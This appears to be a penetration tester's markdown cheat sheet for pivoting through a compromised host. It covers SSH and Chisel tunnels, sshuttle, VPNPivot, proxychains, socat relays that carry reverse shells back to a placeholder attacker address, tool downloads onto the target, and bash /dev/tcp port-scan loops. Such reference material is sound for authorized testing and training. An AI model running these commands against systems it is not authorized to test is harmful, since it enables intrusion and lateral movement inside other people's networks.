# Pivoting Tools

- [Pivoting Tools](#pivoting-tools)
  - [Tunnelling/Proxying](#tunnellingproxying)
    - [SSH - Local Connections](#ssh---local-connections)
    - [SSH - Reverse Connections](#ssh---reverse-connections)
    - [sshuttle](#sshuttle)
    - [VPNPivot - pivots/pivotc](#vpnpivot---pivotspivotc)
    - [Chisel](#chisel)
    - [Server (Attacker)](#server-attacker)
    - [Target](#target)
      - [Proxychains](#proxychains)
  - [Port Forwarding](#port-forwarding)
    - [SSH - Local Connections](#ssh---local-connections-1)
    - [SSH - Remote Connections](#ssh---remote-connections)
    - [Chisel](#chisel-1)
- [Network enumeration](#network-enumeration)
  - [Useful command](#useful-command)
  - [Static-binaries](#static-binaries)
  - [Reverse Shell Relay](#reverse-shell-relay)
    - [Local Connections](#local-connections)
    - [Remote Connections](#remote-connections)
  - [Port scan](#port-scan)
    - [Nmap](#nmap)
    - [Pnscan](#pnscan)
    - [Bash - Script](#bash---script)

## Tunnelling/Proxying

### SSH - Local Connections

> Attacker

```bash
ssh -D 1080 TARGET_USER@TARGET_IP -fN
```

Test:

```bash
proxychains command 
```

### SSH - Reverse Connections

> Attacker

```bash
ssh-keygen
```

nano ~/.ssh/authorized_keys

```bash
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty ssh-rsa XXX_PUB_KEY_XXX
```

> Target

```bash
ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
```

### sshuttle

> Attacker (with password)

```bash
sshuttle -r TARGET_USER@TARGET_IP  IP_ADDRESS_PIVOT_NET/24
```

> Attacker (with key-based authentication)

```bash
sshuttle -r TARGET_USER@TARGET_IP --ssh-cmd "ssh -i KEYFILE"  IP_ADDRESS_PIVOT_NET/24
```

### VPNPivot - pivots/pivotc

> Install tool

Repo: `git clone https://github.com/0x36/VPNPivot.git`

Arch: `yay vpnpivot`

> Note

```text
Warring: Require root on both side !
```

> Server (Attacker)

```bash
sudo pivots -i tun0 -p 1337 -H de:ad:be:ef:be:ef -v -I IP_ADDRESS_PIVOT_NET/24
```

> Client (Target)

```bash
sudo ./pivotc SERVER_IP_ADDRESS 1337 L_IP_ADDRESS_PIVOT_NET
```

### Chisel

### Server (Attacker)

```powershell
1.  chisel server -p 8000 -reverse
4.  chisel client 127.0.0.1:8001 socks
```

### Target

```powershell
2.  chisel client Server_IP:8000 R:8001:127.0.0.1:1337
3.  chisel server -p 1337 --socks5
```

#### Proxychains

> proxychains

nano /etc/proxychains.conf

```text
socks5         127.0.0.1 1080
```

proxychains command

> Nmap

```bash
proxychains -q nmap -sT -P0 IP_ADDRESS
```

> Foxy proxy

```text
For the web 
```

## Port Forwarding

Note:

To avoid issues with `StrictHostKey` the two arguments below can be append to the ssh command:

- `-o "UserKnownHostsFile=/dev/null"`
- `-o "StrictHostKeyChecking=no"`

### SSH - Local Connections

> Attacker

```bash
ssh -L 8000:127.0.0.1:80 TARGET_USER@IP_ADDRESS -fN
```

Test:

```bash
curl 127.0.0.1:8000
```

### SSH - Remote Connections

> Attacker

```bash
ssh-keygen
```

nano ~/.ssh/authorized_keys

```bash
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty ssh-rsa XXX_PUB_KEY_XXX DESCRIPTION
```

> Target

```bash
    ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
```

### Chisel

> Client

```bash
chisel client ATTACKING_IP:LISTEN_PORT R:PROXY_PORT:127.0.0.1:8443
```

> Server

```bash
chisel server -p LISTEN_PORT --reverse
```

Connect:

<https://127.0.0.1:PROXY_PORT>

# Network enumeration

## Useful command

```bash
arp -a 
ifconfig
cat /etc/hosts
netstat -nat
cat /etc/resolv.conf
```

## Static-binaries

Tools:

- ag / the_silver_searcher
- binutils
- file
- ht
- nano
- nmap
- p0f v3
- pv (Pipe Viewer)
- python
- socat
- strace
- tcpdump

Source: <https://github.com/andrew-d/static-binaries>

## Reverse Shell Relay

### Local Connections

![picture 1](images/8366aaa7daebd9b51f083f9a024def1d1a691e2fdba3b8da32e2ec0dcee8030d.png)  

> Attacker

```bash
nc -lvnp 443
```

> Target

```bash
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
```

### Remote Connections

![picture 2](images/2975224e6dc3297696f8fa42570a6d54ad2b5b31e580dfc7c3be50d14f8687ea.png)  

> Attacker

```bash
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

> Target

```bash
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

Test:

```bash
curl 127.0.0.1:8000
```

## Port scan

### Nmap

```bash
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
chmod +x nmap
./nmap ...
```

### Pnscan

```bash
git clone https://github.com/ptrrkssn/pnscan.git
./configure && make
```

> Example

```bash
./pnscan IP_ADDRESS/24 PORT_START:PORT_STOP
./pnscan IP_ADDRESS/24 PORT,PORT,PORT
```

### Bash - Script

> Scan network

```bash
for i in {1..255}; do (ping -c 1 IP_ADDRESS.${i} | grep "bytes from" &); done
```

> Scan port

Top ports:

```bash
for i in {21,22,25,80,88,389,443,445,1433,1521,3306,3389,5432,5985}; do (echo > /dev/tcp/IP_ADDRESS/$i) >/dev/null 2>&1 && echo $i is open; done
```

All ports:

```bash
for i in {1..65535}; do (echo > /dev/tcp/IP_ADDRESS/$i) >/dev/null 2>&1 && echo $i is open; done
```
